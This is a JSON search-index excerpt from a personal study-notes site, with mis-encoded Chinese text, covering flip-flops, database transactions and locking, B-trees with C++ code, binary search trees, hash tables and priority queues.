è¾¹æ²¿è§¦å‘å™¨ #  5.1 ç”µè·¯ç»“æ„ #  5.2 åŠ¨ä½œç‰¹ç‚¹ #  åŠŸèƒ½è¡¨ï¼š\n   D $$Q_{n+1}$$ åŠŸèƒ½     0 0 ç½® â€œ0â€   1 1 ç½® \u0026ldquo;1\u0026rdquo;    é€»è¾‘å…¬å¼ï¼š$$Q_{n+1} = D$$\n5.3 é€»è¾‘ç¬¦å· #   RD ç›´æ¥ç½®0ç«¯ SD ç›´æ¥ç½®1ç«¯  5.4 æ³¢å½¢å›¾ #  6. T è§¦å‘å™¨ #  6.1 ç”µè·¯ç»“æ„ #  ï¼ˆæ²¡æœ‰ï¼‰\n6.2 åŠ¨ä½œç‰¹ç‚¹ #  åŠŸèƒ½è¡¨ï¼š\n   T $$Q^{n+1}$$ åŠŸèƒ½     0 $$Q^n$$ ä¿æŒ   1 $$\\overline{Q^n}$$ è®¡æ•°    ç‰¹æ€§æ–¹ç¨‹ï¼š\n$$Q^{n+1} = T \\overline{Q^n} + \\overline{T}Q^n$$\n"},{"id":312,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/","title":"é¢è¯•å¤ä¹ ","section":"æ•°æ®åº“ç³»ç»ŸåŸç†","content":" å‚è€ƒï¼š\n  https://www.zhihu.com/question/31346392\n  https://github.com/CyC2018/CS-Notes/blob/master/notes/æ•°æ®åº“ç³»ç»ŸåŸç†.md\n  https://www.jianshu.com/p/f692d4f8a53e\n   æ•°æ®åº“ç³»ç»ŸåŸç† #  äº‹åŠ¡ #  ä¸ºä»€ä¹ˆä¼šå‡ºç°äº‹åŠ¡ï¼ˆTransactionï¼‰ï¼Ÿ\n ä¸ºäº†å½“åº”ç”¨ç¨‹åºè®¿é—®æ•°æ®åº“çš„æ—¶å€™ï¼Œäº‹åŠ¡èƒ½å¤Ÿç®€åŒ–æˆ‘ä»¬çš„ç¼–ç¨‹æ¨¡å‹ã€‚ åº”ç”¨å±‚ä¸éœ€è¦å»è€ƒè™‘å„ç§å„æ ·çš„æ½œåœ¨é”™è¯¯ï¼ˆç½‘ç»œé”™è¯¯ã€æœåŠ¡å™¨å®•æœºç­‰ï¼‰å’Œå¹¶å‘é—®é¢˜ï¼›  ä»€ä¹ˆæ˜¯äº‹åŠ¡ï¼Ÿ\n æ»¡è¶³ ACID å››ä¸ªç‰¹æ€§çš„ä¸€ç»„æ“ä½œï¼› å¯ä»¥é€šè¿‡ commit æ“ä½œç»“æŸä¸€ä¸ªäº‹åŠ¡ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ RollBack æ“ä½œå›æ»šåˆ°äº‹åŠ¡çš„å¼€å§‹ï¼›  ACIDï¼š\n åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼šäº‹åŠ¡è¢«è§†ä¸ºä¸å¯åˆ†å‰²çš„æœ€å°å•å…ƒï¼Œäº‹åŠ¡çš„æ‰€æœ‰æ“ä½œè¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥å›æ»šï¼ˆå¯ä»¥é€šè¿‡ undo log å®ç°ï¼‰ã€‚ ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šäº‹åŠ¡æ‰§è¡Œå‰åçš„çŠ¶æ€éƒ½æ˜¯æ­£ç¡®çš„ï¼Œäº‹åŠ¡æ“ä½œåº”å½“å°†æ•°æ®åº“ä»ä¸€ä¸ªæ­£ç¡®çŠ¶æ€è½¬ç§»åˆ°å¦ä¸€ä¸ªæ­£ç¡®çŠ¶æ€ï¼› éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼šé™ä½å¹¶å‘äº‹åŠ¡ä¹‹é—´çš„å½±å“ç¨‹åº¦ï¼› æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼šä¸€æ—¦äº‹åŠ¡æäº¤ï¼Œåˆ™å…¶æ‰€åšçš„ä¿®æ”¹å°†ä¼šæ°¸è¿œä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼›è‹¥ç³»ç»Ÿå‘ç”Ÿå´©æºƒï¼Œå¯ä»¥é€šè¿‡ redo log é‡åšï¼›  å¹¶å‘é—®é¢˜ #  å¹¶å‘å¯¼è‡´çš„ä¸€è‡´æ€§é—®é¢˜ï¼š\n  ä¸¢å¤±ä¿®æ”¹ï¼šå¹¶å‘è¿›è¡Œçš„äº‹åŠ¡å¯¹åŒä¸€ä¸ªæ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œåè€…è¦†ç›–äº†å‰è€…çš„å†…å®¹ï¼›\n  è„è¯»ï¼šäº‹åŠ¡ A ä¿®æ”¹äº†ä¸€ä¸ªæ•°æ®ï¼Œä½†æœªæäº¤ï¼›äº‹åŠ¡ B è¯»åˆ°äº†äº‹åŠ¡ A æœªæäº¤çš„æ›´æ–°ç»“æœï¼Œå¦‚æœäº‹åŠ¡ A æäº¤å¤±è´¥è¿›è¡Œäº†å›æ»šï¼Œäº‹åŠ¡ B è¯»åˆ°çš„å°±æ˜¯è„æ•°æ®ã€‚\n  ä¸å¯é‡å¤è¯»ï¼šåœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œå¯¹äºåŒä¸€ä»½æ•°æ®è¯»å–åˆ°çš„ç»“æœä¸ä¸€è‡´ã€‚æ¯”å¦‚ï¼Œäº‹åŠ¡ B åœ¨äº‹åŠ¡ A æäº¤å‰è¯»åˆ°çš„ç»“æœï¼Œå’Œæäº¤åè¯»åˆ°çš„ç»“æœå¯èƒ½ä¸åŒã€‚\né¿å…è¿™ç§æƒ…å†µï¼šåŠ é”æˆ– MVCCï¼›\n  å¹»è¯»ï¼šåœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­ï¼ŒåŒä¸€ä¸ªæŸ¥è¯¢å¤šæ¬¡è¿”å›çš„ç»“æœä¸ä¸€è‡´ã€‚\nå› ä¸ºå¯¹äºæ–°å¢çš„è®°å½•æ ¹æœ¬æ— æ³•åŠ é”ã€‚éœ€è¦å°†äº‹åŠ¡ä¸²è¡ŒåŒ–ï¼Œæ‰èƒ½é¿å…å¹»è¯»ã€‚\n  å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMulti Version Concurrency Control, MVCCï¼‰ï¼š\n å®ç°æ–¹å¼ï¼šé€šè¿‡åœ¨æ¯è¡Œè®°å½•åé¢ä¿å­˜ä¸¤ä¸ªéšè—çš„åˆ—ï¼šä¸€ä¸ªä¿å­˜äº†è¡Œçš„åˆ›å»ºæ—¶é—´ï¼Œä¸€ä¸ªä¿å­˜è¡Œçš„è¿‡æœŸæ—¶é—´ï¼ˆæˆ–åˆ é™¤æ—¶é—´ï¼‰ã€‚å½“ç„¶å­˜å‚¨çš„å¹¶ä¸æ˜¯å®é™…çš„æ—¶é—´å€¼ï¼Œè€Œæ˜¯ç³»ç»Ÿç‰ˆæœ¬å·ï¼ˆsystem version number)ã€‚æ¯å¼€å§‹ä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œç³»ç»Ÿç‰ˆæœ¬å·éƒ½ä¼šè‡ªåŠ¨é€’å¢ã€‚  åœ¨ REPEATABLE READ éš”ç¦»çº§åˆ«ä¸‹ï¼ŒMVCC çš„â€œå¢åˆ æ”¹æŸ¥â€å››ç§æ“ä½œï¼š\n INSERTï¼šInnoDB ä¸ºæ–°æ’å…¥çš„æ¯ä¸€è¡Œä¿å­˜å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºè¡Œåˆ›å»ºæ ‡è¯†ã€‚ DELETEï¼šInnoDB ä¸ºåˆ é™¤çš„æ¯ä¸€è¡Œä¿å­˜å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºè¡Œåˆ é™¤æ ‡è¯†ã€‚ UPDATEï¼šInnoDB ä¼šæ’å…¥ä¸€è¡Œæ–°çš„è®°å½•ï¼Œä¿å­˜å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºåˆ›å»ºæ ‡è¯†ï¼ŒåŒæ—¶ä¿å­˜å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·åˆ°åŸæ¥çš„è¡Œä½œä¸ºè¡Œåˆ é™¤æ ‡è¯†ã€‚ SELECTï¼šInnoDB ä¼šæ ¹æ®ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶æ£€æŸ¥æ¯è¡Œè®°å½•ï¼ŒInnoDB åªæŸ¥æ‰¾ï¼š  åˆ›å»ºæ ‡è¯†æ—©äºå½“å‰äº‹åŠ¡ç‰ˆæœ¬çš„æ•°æ®è¡Œï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿äº‹åŠ¡è¯»å–çš„è¡Œï¼Œè¦ä¹ˆæ˜¯åœ¨äº‹åŠ¡å¼€å§‹å‰å·²ç»å­˜åœ¨çš„ï¼Œè¦ä¹ˆæ˜¯äº‹åŠ¡è‡ªèº«æ’å…¥æˆ–è€…ä¿®æ”¹è¿‡çš„ã€‚ è¡Œçš„åˆ é™¤æ ‡å¿—è¦ä¹ˆæœªå®šä¹‰ï¼Œè¦ä¹ˆå¤§äºå½“å‰äº‹åŠ¡ç‰ˆæœ¬å·ã€‚è¿™å¯ä»¥ç¡®ä¿äº‹åŠ¡è¯»å–åˆ°çš„è¡Œï¼Œåœ¨äº‹åŠ¡å¼€å§‹ä¹‹å‰æœªè¢«åˆ é™¤ã€‚    å°é” #  åœ¨ MySQL ä¸­ï¼Œæä¾›äº†ä¸¤ç§å°é”ç²’åº¦ï¼šè¡Œçº§é”ä»¥åŠè¡¨çº§é”ã€‚å¦‚ä½•é€‰ç”¨é”ï¼Ÿ\n åº”è¯¥å°½é‡åªé”å®šéœ€è¦ä¿®æ”¹çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œè€Œä¸æ˜¯æ‰€æœ‰çš„èµ„æºã€‚é”å®šçš„æ•°æ®é‡è¶Šå°‘ï¼Œå‘ç”Ÿé”äº‰ç”¨çš„å¯èƒ½å°±è¶Šå°ï¼Œç³»ç»Ÿçš„å¹¶å‘ç¨‹åº¦å°±è¶Šé«˜ã€‚ åŠ é”éœ€è¦æ¶ˆè€—èµ„æºï¼Œé”çš„å„ç§æ“ä½œï¼ˆåŒ…æ‹¬è·å–é”ã€é‡Šæ”¾é”ã€ä»¥åŠæ£€æŸ¥é”çŠ¶æ€ï¼‰éƒ½ä¼šå¢åŠ ç³»ç»Ÿå¼€é”€ã€‚å› æ­¤å°é”ç²’åº¦è¶Šå°ï¼Œç³»ç»Ÿå¼€é”€å°±è¶Šå¤§ã€‚  é”çš„ç±»å‹ï¼ˆè¯»å†™é”ï¼‰ï¼š\n  äº’æ–¥é”ï¼ˆExlusiveï¼‰ï¼ŒX é”ï¼Œæˆ–å†™é”ã€‚\näº‹åŠ¡ T å¯¹æ•°æ® D åŠ äº† X é”ï¼ŒT å°±å¯ä»¥å¯¹ D è¿›è¡Œè¯»å†™ï¼Œå…¶ä»–äº‹åŠ¡ä¸å¯¹èƒ½ D åŠ é”ï¼›\n  å…±äº«é”ï¼ˆSharedï¼‰ï¼ŒS é”ï¼Œæˆ–è¯»é”ã€‚\näº‹åŠ¡ T å¯¹æ•°æ® D åŠ äº† S é”ï¼ŒT åªå¯ä»¥å¯¹ D è¿›è¡Œè¯»ï¼ŒåŠ é”æœŸé—´å…¶ä»–äº‹åŠ¡å¯ä»¥å¯¹ D åŠ  S é”ã€ä¸èƒ½åŠ  X é”ï¼›\n  æ„å‘é”ï¼ˆIntention Locksï¼‰ï¼š\n èƒŒæ™¯ï¼šåœ¨å­˜åœ¨è¡Œçº§é”å’Œè¡¨çº§é”çš„æƒ…å†µä¸‹ï¼Œäº‹åŠ¡ T æƒ³è¦å¯¹è¡¨ A åŠ  X é”ï¼Œå°±éœ€è¦å…ˆæ£€æµ‹æ˜¯å¦æœ‰å…¶å®ƒäº‹åŠ¡å¯¹è¡¨ A æˆ–è€…è¡¨ A ä¸­çš„ä»»æ„ä¸€è¡ŒåŠ äº†é”ï¼Œé‚£ä¹ˆå°±éœ€è¦å¯¹è¡¨ A çš„æ¯ä¸€è¡Œéƒ½æ£€æµ‹ä¸€æ¬¡ï¼Œè¿™æ˜¯éå¸¸è€—æ—¶çš„ã€‚ æ„å‘é”åœ¨åŸæ¥çš„ X/S é”ä¹‹ä¸Šå¼•å…¥äº† IX/IS è¡¨é”ï¼Œå®ƒä»¬ä½¿ç”¨æœ‰ä»¥ä¸‹è§„å®šï¼š  ä¸€ä¸ªäº‹åŠ¡åœ¨è·å¾—æŸä¸ªæ•°æ®è¡Œå¯¹è±¡çš„ S é”ä¹‹å‰ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ IS é”æˆ–è€…æ›´å¼ºçš„é”ï¼› ä¸€ä¸ªäº‹åŠ¡åœ¨è·å¾—æŸä¸ªæ•°æ®è¡Œå¯¹è±¡çš„ X é”ä¹‹å‰ï¼Œå¿…é¡»å…ˆè·å¾—è¡¨çš„ IX é”ã€‚ ä»»æ„ IS/IX é”ä¹‹é—´éƒ½æ˜¯å…¼å®¹çš„ï¼Œå› ä¸ºå®ƒä»¬åªè¡¨ç¤ºæƒ³è¦å¯¹è¡¨åŠ é”ï¼Œè€Œä¸æ˜¯çœŸæ­£åŠ é”ï¼›    å°é”åè®®ï¼š\n ä¸€çº§å°é”åè®®ï¼šäº‹åŠ¡ T è¦ä¿®æ”¹æ•°æ® A æ—¶å¿…é¡»åŠ  X é”ï¼Œç›´åˆ° T ç»“æŸæ‰é‡Šæ”¾é”ï¼› äºŒçº§å°é”åè®®ï¼šåœ¨ä¸€çº§çš„åŸºç¡€ä¸Šï¼Œè¦æ±‚è¯»å–æ•°æ® A æ—¶å¿…é¡»åŠ  S é”ï¼Œè¯»å–å®Œé©¬ä¸Šé‡Šæ”¾ S é”ï¼› ä¸‰çº§å°é”åè®®ï¼šåœ¨ä¸€çº§çš„åŸºç¡€ä¸Šï¼Œè¦æ±‚è¯»å–æ•°æ® A æ—¶å¿…é¡»åŠ  S é”ï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸäº†æ‰èƒ½é‡Šæ”¾ S é”ï¼›  éš”ç¦»çº§åˆ« #  æ•°æ®åº“éš”ç¦»æ€§è¡¨ç°çš„å››ä¸ªç­‰çº§ï¼Œç”±ä½åˆ°é«˜åˆ†åˆ«æ˜¯ï¼š\n æœªæäº¤è¯»ï¼ˆREAD UNCOMMITTEDï¼‰ï¼šäº‹åŠ¡ä¸­çš„ä¿®æ”¹å³ä½¿æ²¡æœ‰æäº¤ï¼Œå¯¹å…¶ä»–äº‹åŠ¡ä¹Ÿæ˜¯å¯è§çš„ï¼› æäº¤è¯»ï¼ˆREAD COMMITTEDï¼‰ï¼šä¸€ä¸ªäº‹åŠ¡åªèƒ½è¯»å–å·²ç»æäº¤çš„äº‹åŠ¡æ‰€åšçš„ä¿®æ”¹ã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ªäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹åœ¨æäº¤ä¹‹å‰å¯¹å…¶å®ƒäº‹åŠ¡æ˜¯ä¸å¯è§çš„ã€‚ å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰ï¼šä¿è¯åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­å¤šæ¬¡è¯»å–åŒä¸€æ•°æ®çš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼› å¯ä¸²è¡ŒåŒ–ï¼ˆSERIALIZABLEï¼‰ï¼šå¼ºåˆ¶äº‹åŠ¡ä¸²è¡Œæ‰§è¡Œï¼Œè¿™æ ·å¤šä¸ªäº‹åŠ¡äº’ä¸å¹²æ‰°ï¼Œä¸ä¼šå‡ºç°å¹¶å‘ä¸€è‡´æ€§é—®é¢˜ã€‚  "},{"id":313,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/b-tree/","title":"B Tree","section":"æ•°æ®ç»“æ„","content":" å­¦ä¹ é“¾æ¥ï¼š\n https://www.geeksforgeeks.org/b-tree-set-1-introduction-2/ https://www.geeksforgeeks.org/b-tree-set-1-insert-2/   B-Tree #  Introduction #  Defination:\n B-Tree is a self-balancing search tree. In most of the other self-balancing search trees (like AVL and Red-Black Trees), it is assumed that everything is in main memory.\n Usage:\n Disk access time is very high compared to main memory access time. The main idea of using B-Trees is to reduce the number of disk accesses.\n Analysis:\n Most of the tree operations (search, insert, delete, max, min, ..etc ) require O(h) disk accesses where h is the height of the tree.\nGenerally, a B-Tree node size is kept equal to the disk block size.\n Properties:\n All leaves are at same level. A B-Tree is defined by the term minimum degree â€˜tâ€™. The value of t depends upon disk block size. Every node except root must contain at least t-1 keys. Root may contain minimum 1 key. All nodes (including root) may contain at most 2t â€“ 1 keys. Number of children of a node is equal to the number of keys in it plus 1. All keys of a node are sorted in increasing order. The child between two keys k1 and k2 contains all keys in the range from k1 and k2. B-Tree grows and shrinks from the root which is unlike Binary Search Tree. Binary Search Trees grow downward and also shrink from downward. Like other balanced Binary Search Trees, time complexity to search, insert and delete is O(Logn).  Method #  Traverse #  template\u0026lt;class T\u0026gt; list\u0026lt;T\u0026gt; BTree\u0026lt;T\u0026gt;::traverse()const{  // terminated condition: this is a leaf node  if(this-\u0026gt;is_leaf_node()) return this-\u0026gt;data;   auto i = this-\u0026gt;data.begin();  auto j = this-\u0026gt;children.begin();  // traverse the first child tree  list\u0026lt;T\u0026gt; res = (*j)-\u0026gt;traverse();  // begin with the first data node =\u0026gt;  // traverse the node and its next node tree in order  for(++j; i != this-\u0026gt;data.end(); ++j, ++i){  res.push_back(*i);  auto tr = (*j)-\u0026gt;traverse();  res.insert(res.end(), tr.begin(), tr.end());  }  return res; } Search #  template\u0026lt;class T\u0026gt; BTree\u0026lt;T\u0026gt;* BTree\u0026lt;T\u0026gt;::search(const T\u0026amp; val)const{  auto i = this-\u0026gt;data.begin();  auto j = this-\u0026gt;children.begin();  for(;i != this-\u0026gt;data.end(); ++i)  if(*i \u0026lt; val) ++j; else break;   if(*i == val) return this;  if(this-\u0026gt;is_leaf_node()) return NULL;   return (*j)-\u0026gt;search(val); } Insert #  Unlike BSTs, we have a predefined range on number of keys that a node can contain. So before inserting a key to node, we make sure that the node has extra space.\nSo Here is a question: How to make sure that a node has space available for key before the key is inserted?\n We use an operation called splitChild() that is used to split a child of a node.  As discussed above, to insert a new key:\n Initialize x as root. While x is not leaf, do following  Find the child of x that is going to to be traversed next. Let the child be y. If y is not full, change x to point to y. If y is full, split it and change x to point to one of the two parts of y. If k is smaller than mid key in y, then set x as first part of y. Else second part of y. When we split y, we move a key from y to its parent x.   The loop in step 2 stops when x is leaf. x must have space for 1 extra key as we have been splitting all nodes in advance. So simply insert k to x.  "},{"id":314,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/bintree/","title":"Bin Tree","section":"æ•°æ®ç»“æ„","content":"Chapter 10\u0026ndash;Binary Trees #  Binary Trees #  Definitions #  Binary Tree:\n A binary tree is either empty, or it consists of a node called the root together with two binary trees called the left subtree and the right subtree of the root.\n  Empty Tree: The first case, the base case that involves no recursion, is that of an empty binary tree. The empty tree will usually be the base case for recursive algorithms and will determine when the algorithm stops. One node tree: The only way to construct a binary tree with one node is to make that node into the root and to make both the left and right subtrees empty. Thus a single node with no branches is the one and only binary tree with one node. Tree node tree: With two nodes in the tree, one of them will be the root and the other will be in a subtree.  Traversal #  If we name the tasks of visiting a node V, traversing the left subtree L, and traversing the right subtree R, then there are six ways to arrange them:\nstandard traversal orders #   VLR â†’ preorder LVR â†’ inorder(symmetric oder) LRV â†’ postorder (endorder)  Expression Trees #   An expression tree is built up from the simple operands and operators of an (arithmetical or logical) expression by placing the simple operands as the leaves of a binary tree and the operators as the interior nodes.\n   For each binary operator, the left subtree contains all the simple operands and operators in the left operand of the given operator, and the right subtree contains everything in the right operand.\n  For a unary operator, one of the two subtrees will be empty.\n  The names of the traversal methods are related to the Polish forms of the expressions:\n preorder traversal yields the prefix form, in which every operator is written before its operand(s); inorder traversal gives the infix form (the customary way to write the expression); postorder traversal gives the postfix form, in which all operators appear after their operand(s).  Linked Implementation #  Basic method #   empty constructor â†’ set root pointer as NULL. (check empty). visit a node. Recursive traversal.  Binary search trees #  Defination #   A binary search tree is a binary tree that is either empty or in which every node has a key (within its data entry) and satisfies the following conditions:\n The key of the root (if it exists) is greater than the key in any node in the left subtree of the root. The key of the root (if it exists) is less than the key in any node in the right subtree of the root. The left and right subtrees of the root are again binary search trees.   Tree Search #  Strategy:\n To search for the target, we first compare it with the entry at the root of the tree. If their keys match, then we are finished. Otherwise, we go to the left subtree or right subtree as appropriate and repeat the search in that subtree.  Insertion #  Treesort #  defination #   We simply take the entries to be sorted, use the method insert to build them into a binary search tree, and use inorder traversal to put them out in order.\n comparison with quick-sort #  Treesort makes exactly the same comparisons of keys as does quicksort when the pivot for each sublist is chosen to be the first key in the sublist.\nRemoval #    case 1: deletion of a leaf.\n  case 2: one subtree empty.\n  case 3: none subtree empty.\n  Building a binary search tree #  "},{"id":315,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/dictionary/","title":"Dictionary","section":"æ•°æ®ç»“æ„","content":"å­—å…¸ #  ADT æŠ½è±¡æ•°æ®ç±»å‹ #  ADT dictionary\r{\rDATA:\rdata_pair key_value[];\rMETHOD:\rempty(): return true if key_value is empty.\rsize(): return size of key_value.\rfind(k): return pointer in key_value whose key is k.\rinsert(p): insert data_pair p into key_value.\rerase(k): erase data_pair from key_value where its key is k.\r} çº¿æ€§è¡¨è¡¨ç¤º #  ä¸¤ä¸ªç±» sortedArrayList å’Œ sortedChain åˆ†åˆ«å­˜å‚¨é”®å’Œå€¼ã€‚\nè·³è¡¨è¡¨ç¤º #  è·³è·ƒè¡¨ï¼ˆskiplistï¼‰æ˜¯ä¸€ç§éšæœºåŒ–çš„æ•°æ®ï¼Œ ç”± William Pugh åœ¨è®ºæ–‡ã€ŠSkip lists: a probabilistic alternative to balanced treesã€‹ä¸­æå‡ºï¼Œ è·³è·ƒè¡¨ä»¥æœ‰åºçš„æ–¹å¼åœ¨å±‚æ¬¡åŒ–çš„é“¾è¡¨ä¸­ä¿å­˜å…ƒç´ ï¼Œ æ•ˆç‡å’Œå¹³è¡¡æ ‘åª²ç¾ â€”â€” æŸ¥æ‰¾ã€åˆ é™¤ã€æ·»åŠ ç­‰æ“ä½œéƒ½å¯ä»¥åœ¨å¯¹æ•°æœŸæœ›æ—¶é—´ä¸‹å®Œæˆï¼Œ å¹¶ä¸”æ¯”èµ·å¹³è¡¡æ ‘æ¥è¯´ï¼Œ è·³è·ƒè¡¨çš„å®ç°è¦ç®€å•ç›´è§‚å¾—å¤šã€‚\næ•£åˆ—è¡¨ç¤º #  æ•£åˆ—å‡½æ•°ä¸º fï¼Œæ•°å¯¹ p çš„å…³é”®å­—å¦‚æœæ˜¯ kï¼Œé‚£ä¹ˆå®ƒåœ¨æ•£åˆ—è¡¨ä¸­çš„ä½ç½®å°±æ˜¯ f(k)ã€‚\næ€§èƒ½åˆ†æï¼šè®¾ b ä¸ºæ•£åˆ—è¡¨çš„æ¡¶æ•°ï¼Œn ä¸ºæ•£åˆ—è¡¨ä¸­çš„è®°å½•ä¸ªæ•°ï¼Œä»¤ $$U_n$$ å’Œ $$S_n$$ åˆ†åˆ«è¡¨ç¤ºåœ¨ä¸€ä¸ªæˆåŠŸæœç´¢å’Œä¸æˆåŠŸæœç´¢ä¸­å¹³å‡æœç´¢çš„æ¡¶æ•°ï¼Œåˆ™ï¼š\n $${\\displaystyle U_n = \\frac{1}{2} (1 + \\frac{1}{(1 - \\alpha)^2})}$$ $$\\displaystyle S_n = \\frac{1}{2} (1 + \\frac{1}{(1 - \\alpha)})$$  å…¶ä¸­ $$\\displaystyle \\alpha = \\frac{n}{b}$$ ç§°ä¸ºè´Ÿè½½å› å­ (loading factor)ã€‚\nLZW å‹ç¼©æ³• #  ï¼ˆæ‡’å¾—å†™äº†ï¼‰\n"},{"id":316,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/priorityqueue/","title":"Priority Queue","section":"æ•°æ®ç»“æ„","content":"ä¼˜å…ˆçº§é˜Ÿåˆ— #  ADT æŠ½è±¡æ•°æ®ç±»å‹ #  ADT maxPriorityQueue\r{\rDATA:\relement ele_queue[];\rMETHOD:\rempty():\treturn true if ele_queue is empty.\rsize():\treturn size of ele_queue.\rtop(): return the element with max priority.\rpop():\tdelete the element with max priority.\rpush(x):\tpush element \u0026#34;x\u0026#34;.\r} å † #  æ¦‚å¿µï¼šå¤§æ ¹å †ï¼Œå°æ ¹å †ã€‚\nå·¦é«˜æ ‘ #  æ¦‚å¿µï¼š\n  å¤–éƒ¨ç»“ç‚¹ï¼ˆexternal nodeï¼‰ï¼šåŠ å…¥åœ¨æ ‘ä¸­æ‰€æœ‰ç©ºå­æ ‘çš„ç»“ç‚¹ã€‚\n  å†…éƒ¨ç»“ç‚¹ï¼ˆinternal nodeï¼‰ï¼šåŸæœ¬å°±å­˜åœ¨çš„ç»“ç‚¹ã€‚\n  æ‰©å……äºŒå‰æ ‘ï¼ˆextended binary treeï¼‰ï¼šå¢åŠ äº†å¤–éƒ¨èŠ‚ç‚¹çš„äºŒå‰æ ‘ã€‚\n  ä»¤ s(x) æ˜¯ä»ç»“ç‚¹ x åˆ°å…¶å­æ ‘çš„å¤–éƒ¨èŠ‚ç‚¹çš„æ‰€æœ‰è·¯å¾„ä¸­æœ€çŸ­çš„ä¸€æ¡ï¼Œåˆ™ï¼š\n  é«˜åº¦ä¼˜å…ˆå·¦é«˜æ ‘ï¼ˆheight-based leftist tree, HBLTï¼‰ï¼šå…¶å†…éƒ¨ç»“ç‚¹çš„å·¦å­©å­çš„ s å€¼éƒ½å¤§äºæˆ–ç­‰äºå³å­©å­çš„ s å€¼ã€‚\n  æœ€å¤§ HBLTï¼šåŒæ—¶ä¸ºå¤§æ ¹æ ‘å’Œ HBLT çš„äºŒå‰æ ‘ã€‚\n  ä»¤ w(x) æ˜¯ä»¥ç»“ç‚¹ x ä¸ºæ ¹çš„å­æ ‘çš„å†…éƒ¨ç»“ç‚¹æ•°ç›®ï¼š\n é‡é‡ä¼˜å…ˆå·¦é«˜æ ‘ï¼ˆweight-biased leftist tree, WBLTï¼‰ï¼šå…¶å†…éƒ¨ç»“ç‚¹çš„å·¦å­©å­çš„ w å€¼éƒ½å¤§äºæˆ–ç­‰äºå³å­©å­çš„ w å€¼ã€‚ æœ€å¤§ WBLTï¼šåŒæ—¶ä¸ºå¤§æ ¹æ ‘å’Œ WBLT çš„äºŒå‰æ ‘ã€‚  C++ #  C++ çš„ STL åº“ä¸­ç”± prioryty_queue è¿™ä¸ªç±»å¯ä»¥å®ç°ä¼˜å…ˆçº§é˜Ÿåˆ—ã€‚\n"},{"id":317,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/review/","title":"Review","section":"æ•°æ®ç»“æ„","content":"REVIEW #  1. åŸºæœ¬çŸ¥è¯† #  ç»´åŸºç™¾ç§‘ä¸Šåˆ—å‡ºäº†ä¸‹é¢çš„æ—¶é—´å¤æ‚åº¦ç§ç±»ï¼š\n   åç§° è¿è¡Œæ—¶é—´ï¼ˆ$${\\displaystyle T(n)}$$ï¼‰ ç®—æ³•ä¸¾ä¾‹     å¸¸æ•°æ—¶é—´ $${\\displaystyle O(1)}$$ åˆ¤æ–­ä¸€ä¸ªäºŒè¿›åˆ¶æ•°çš„å¥‡å¶   åé˜¿å…‹æ›¼æ—¶é—´ $${\\displaystyle O(\\alpha (n))}$$ å¹¶æŸ¥é›†çš„å•ä¸ªæ“ä½œçš„å¹³æ‘Šæ—¶é—´   è¿­ä»£å¯¹æ•°æ—¶é—´ $${\\displaystyle O(\\log ^{*}n)}$$ åˆ†å¸ƒå¼åœ†ç¯ç€è‰²é—®é¢˜   å¯¹æ•°å¯¹æ•°æ—¶é—´ $${\\displaystyle O(\\log \\log n)}$$ æœ‰ç•Œä¼˜å…ˆé˜Ÿåˆ—çš„å•ä¸ªæ“ä½œ   å¯¹æ•°æ—¶é—´ $${\\displaystyle O(\\log n)}$$ äºŒåˆ†æœç´¢   å¹‚å¯¹æ•°æ—¶é—´ $${\\displaystyle (\\log n)^{O(1)}}$$    ï¼ˆå°äº1æ¬¡ï¼‰å¹‚æ—¶é—´ $${\\displaystyle O(n^{c})}$$ï¼Œå…¶ä¸­$${\\displaystyle 0\u0026lt;c\u0026lt;1}$$ K-d æ ‘çš„æœç´¢æ“ä½œ   çº¿æ€§æ—¶é—´ $${\\displaystyle O(n)}$$ æ— åºæ•°ç»„çš„æœç´¢   çº¿æ€§è¿­ä»£å¯¹æ•°æ—¶é—´ $${\\displaystyle O(n\\log ^{*}n)}$$ 